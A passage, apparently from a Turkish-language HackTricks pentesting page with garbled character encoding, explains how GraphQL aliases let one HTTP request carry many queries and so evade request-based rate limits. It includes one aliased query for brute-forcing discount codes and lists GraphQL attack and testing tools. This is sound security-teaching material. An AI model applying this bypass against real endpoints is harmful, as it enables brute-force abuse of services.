GraphQL'de, aliasler API isteÄŸi yapÄ±lÄ±rken **Ã¶zelliklerin aÃ§Ä±kÃ§a adlandÄ±rÄ±lmasÄ±na** olanak tanÄ±yan gÃ¼Ã§lÃ¼ bir Ã¶zelliktir. Bu yetenek, tek bir istekte **aynÄ± tÃ¼rden birden fazla Ã¶rneÄŸi** almak iÃ§in Ã¶zellikle kullanÄ±ÅŸlÄ±dÄ±r. Aliasler, GraphQL nesnelerinin aynÄ± ada sahip birden fazla Ã¶zelliÄŸe sahip olmasÄ±nÄ± engelleyen kÄ±sÄ±tlamayÄ± aÅŸmak iÃ§in kullanÄ±labilir.

GraphQL aliaslerinin detaylÄ± anlaÅŸÄ±lmasÄ± iÃ§in aÅŸaÄŸÄ±daki kaynak Ã¶nerilir: [Aliasler](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Aliaslerin asÄ±l amacÄ± birÃ§ok API Ã§aÄŸrÄ±sÄ±na gerek duymayÄ± azaltmaktÄ±r, ancak aliaslerin yanlÄ±ÅŸlÄ±kla kullanÄ±labileceÄŸi bir durum tespit edilmiÅŸtir: aliasler, GraphQL uÃ§ noktasÄ±nda brute force saldÄ±rÄ±larÄ± gerÃ§ekleÅŸtirmek iÃ§in kullanÄ±labilir. Bu, bazÄ± uÃ§ noktalarÄ±n brute force saldÄ±rÄ±larÄ±nÄ± sÄ±nÄ±rlayarak **HTTP isteklerinin sayÄ±sÄ±nÄ±** kÄ±sÄ±tlayan hÄ±z sÄ±nÄ±rlayÄ±cÄ±larla korunduÄŸu iÃ§in mÃ¼mkÃ¼ndÃ¼r. Bununla birlikte, bu hÄ±z sÄ±nÄ±rlayÄ±cÄ±lar her istekteki iÅŸlemlerin sayÄ±sÄ±nÄ± hesaba katmayabilir. Aliasler, bir HTTP isteÄŸinde birden fazla sorgunun dahil edilmesine izin verdiÄŸi iÃ§in, bu tÃ¼r hÄ±z sÄ±nÄ±rlama Ã¶nlemlerini atlayabilir.

AÅŸaÄŸÄ±daki Ã¶rneÄŸi dÃ¼ÅŸÃ¼nÃ¼n, bu Ã¶rnek, maÄŸaza indirim kodlarÄ±nÄ±n geÃ§erliliÄŸini doÄŸrulamak iÃ§in aliasli sorgularÄ±n nasÄ±l kullanÄ±labileceÄŸini gÃ¶stermektedir. Bu yÃ¶ntem, birÃ§ok indirim kodunun aynÄ± anda doÄŸrulanmasÄ±na izin vererek hÄ±z sÄ±nÄ±rlamayÄ± atlayabilir.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## AraÃ§lar

### GÃ¼venlik aÃ§Ä±ÄŸÄ± tarayÄ±cÄ±larÄ±

* [https://github.com/gsmith257-cyber/GraphCrawler](https://github.com/gsmith257-cyber/GraphCrawler): ÅemalarÄ± almak ve hassas verileri aramak, yetkilendirme testi yapmak, ÅŸemalarÄ± kaba kuvvet uygulamak ve belirli bir tÃ¼re giden yollarÄ± bulmak iÃ§in kullanÄ±labilen bir araÃ§ seti.
* [https://blog.doyensec.com/2020/03/26/graphql-scanner.html](https://blog.doyensec.com/2020/03/26/graphql-scanner.html): BaÄŸÄ±msÄ±z olarak veya [Burp uzantÄ±sÄ±](https://github.com/doyensec/inql) olarak kullanÄ±labilir.
* [https://github.com/swisskyrepo/GraphQLmap](https://github.com/swisskyrepo/GraphQLmap): AyrÄ±ca bir CLI istemcisi olarak da kullanÄ±labilir ve saldÄ±rÄ±larÄ± otomatikleÅŸtirmek iÃ§in kullanÄ±labilir.
* [https://gitlab.com/dee-see/graphql-path-enum](https://gitlab.com/dee-see/graphql-path-enum): Bir GraphQL ÅŸemasÄ±nda belirli bir tÃ¼re ulaÅŸmanÄ±n farklÄ± yollarÄ±nÄ± listeleyen bir araÃ§.
* [https://github.com/doyensec/inql](https://github.com/doyensec/inql): GeliÅŸmiÅŸ GraphQL testi iÃ§in Burp uzantÄ±sÄ±. _**TarayÄ±cÄ±**_, InQL v5.0'Ä±n Ã§ekirdeÄŸidir, burada bir GraphQL uÃ§ noktasÄ±nÄ± veya yerel bir keÅŸif ÅŸema dosyasÄ±nÄ± analiz edebilirsiniz. TÃ¼m olasÄ± sorgularÄ± ve mutasyonlarÄ± otomatik olarak oluÅŸturur ve analiziniz iÃ§in yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir gÃ¶rÃ¼nÃ¼me yerleÅŸtirir. _**SaldÄ±rgan**_ bileÅŸeni, kÃ¶tÃ¼ uygulanmÄ±ÅŸ hÄ±z sÄ±nÄ±rlarÄ±nÄ± atlamak iÃ§in kullanÄ±ÅŸlÄ± olabilecek toplu GraphQL saldÄ±rÄ±larÄ± Ã§alÄ±ÅŸtÄ±rmanÄ±za olanak tanÄ±r.

### Ä°stemciler

* [https://github.com/graphql/graphiql](https://github.com/graphql/graphiql): GUI istemcisi
* [https://altair.sirmuel.design/](https://altair.sirmuel.design/): GUI Ä°stemcisi

### Otomatik Testler

{% embed url="https://graphql-dashboard.herokuapp.com/" %}

* AutoGraphQL'yi aÃ§Ä±klayan video: [https://www.youtube.com/watch?v=JJmufWfVvyU](https://www.youtube.com/watch?v=JJmufWfVvyU)

## Referanslar

* [**https://jondow.eu/practical-graphql-attack-vectors/**](https://jondow.eu/practical-graphql-attack-vectors/)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4**](https://medium.com/@apkash8/graphql-vs-rest-api-model-common-security-test-cases-for-graphql-endpoints-5b723b1468b4)
* [**http://ghostlulz.com/api-hacking-graphql/**](http://ghostlulz.com/api-hacking-graphql/)
* [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/GraphQL%20Injection/README.md)
* [**https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696**](https://medium.com/@the.bilal.rizwan/graphql-common-vulnerabilities-how-to-exploit-them-464f9fdce696)
* [**https://portswigger.net/web-security/graphql**](https://portswigger.net/web-security/graphql)

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahraman seviyesine Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini alÄ±n**](https://peass.creator-spring.com)
* [**The PEASS Family'yi keÅŸfedin**](https://opensea.io/collection/the-peass-family), Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keÅŸfedin
* **ğŸ’¬ [Discord grubuna](https://discord.gg/hRep4RUj7f) katÄ±lÄ±n veya [telegram grubuna](https://t.me/peass) katÄ±lÄ±n veya** bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak HackTricks ve HackTricks Cloud** github depolarÄ±na PR'lar gÃ¶ndererek **hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸÄ±n.**

</details>
